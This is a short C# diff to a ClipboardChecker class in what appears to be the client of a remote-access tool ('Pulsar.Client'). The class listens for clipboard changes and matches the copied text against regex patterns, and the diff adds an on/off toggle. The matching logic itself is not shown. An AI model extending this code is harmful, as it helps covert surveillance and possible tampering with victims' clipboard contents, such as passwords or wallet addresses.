@@ -11,11 +11,12 @@ using System.Diagnostics;
 namespace Pulsar.Client.User
 {
     // do some hacker stuff and hooking and it'll monitor whenevrr client copies
-    internal class ClipboardChecker : NativeWindow, IDisposable
+    public class ClipboardChecker : NativeWindow, IDisposable
     {
         private readonly PulsarClient _client;
         private readonly List<Tuple<string, Regex>> _regexPatterns;
         private string _lastClipboardText = "";
+        private bool _isEnabled = false;
         
         private const int WM_CLIPBOARDUPDATE = 0x031D;
 
@@ -45,11 +46,27 @@ namespace Pulsar.Client.User
             };
             this.CreateHandle(new CreateParams());
             AddClipboardFormatListener(this.Handle);
+            
+            _isEnabled = false;
+            Debug.WriteLine("ClipboardChecker: Initialized with monitoring disabled");
+        }
+
+        /// <summary>
+        /// Gets or sets whether clipboard monitoring is enabled.
+        /// </summary>
+        public bool IsEnabled
+        {
+            get => _isEnabled;
+            set
+            {
+                _isEnabled = value;
+                Debug.WriteLine($"ClipboardChecker: Monitoring {(value ? "enabled" : "disabled")}");
+            }
         }
 
         protected override void WndProc(ref Message m)
         {
-            if (m.Msg == WM_CLIPBOARDUPDATE)
+            if (m.Msg == WM_CLIPBOARDUPDATE && _isEnabled)
             {
                 ClipboardCheck();
             }
